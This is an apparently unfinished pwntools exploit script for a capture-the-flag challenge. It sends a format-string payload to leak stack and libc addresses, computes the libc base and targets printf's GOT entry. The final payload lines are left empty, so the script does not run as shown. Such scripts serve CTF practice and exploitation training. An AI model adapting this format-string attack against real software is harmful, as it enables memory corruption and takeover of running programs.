from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
io=process('./pwn')
#io=remote('node4.buuoj.cn',)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive
def lg(var):
    for name, value in globals().items():
        if value is var:
            log.info(f"{name} => {hex(var)}")
            return
ru(b'>>> ')

elf=ELF('./pwn')
libc=ELF('./libc-2.23_sym.so')
printf_got=elf.got['printf']
#泄露栈地址和libc地址
payload1=b's%8$pl%11$p'

sl(payload1)

ru(b's0x')
stack= int(io.recv(12),16)
lg(stack)

ru(b'l0x')

libcbase= int(io.recv(12),16)-0x20840

word=
p2=








ii()
